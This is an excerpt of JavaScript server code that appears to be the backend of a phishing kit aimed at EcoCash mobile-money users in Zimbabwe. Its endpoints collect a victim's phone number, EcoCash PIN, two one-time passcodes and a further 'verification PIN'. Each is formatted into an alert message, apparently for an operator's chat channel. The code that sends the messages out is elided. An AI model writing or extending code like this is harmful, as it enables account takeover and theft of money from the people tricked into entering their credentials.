...
app.post('/api/login-notification', async (req, res) => {
    ...
    const message = `📱 <b>ECOCASH - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇿🇼 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>EcoCash Number:</b> ${phone}
🔢 <b>EcoCash PIN:</b> ${pin}
...
app.post('/api/verify-first-otp', async (req, res) => {
    ...
    const otpMessage = `1️⃣ <b>ECOCASH - FIRST OTP (Step 1/2)</b>
...
app.post('/api/verify-second-otp', async (req, res) => {
    ...
    const otpMessage2 = `2️⃣ <b>ECOCASH - SECOND OTP (Step 2/2)</b>
...
app.post('/api/verify-bank-pin', async (req, res) => {
    ...
    const bankPinMessage = `🏦 <b>ECOCASH - PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - SECURITY CODE</b>
🇿🇼 <b>Country:</b> ${country}
📱 <b>EcoCash Number:</b> ${phone}
🔑 <b>Verification PIN:</b> ${bankPin}
⏰ <b>Time:</b> ${currentTime}
